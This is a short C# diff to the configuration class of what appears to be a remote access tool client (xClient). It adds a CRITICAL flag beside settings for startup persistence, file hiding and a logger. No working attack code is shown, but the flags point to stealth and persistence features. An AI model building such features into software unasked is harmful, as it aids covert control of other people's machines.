@@ -22,6 +22,7 @@ namespace xClient.Config
         public static string STARTUPKEY = "Test key";
         public static bool HIDEFILE = false;
         public static bool ENABLELOGGER = true;
+        public static bool CRITICAL = true;
         public static string TAG = "DEBUG";
 
         public static void Initialize()
@@ -41,6 +42,7 @@ namespace xClient.Config
         public static string STARTUPKEY = "STARTUP";
         public static bool HIDEFILE = true;
         public static bool ENABLELOGGER = true;
+        public static bool CRITICAL = false;
         public static string ENCRYPTIONKEY = "ENCKEY";
         public static string TAG = "RELEASE";
 
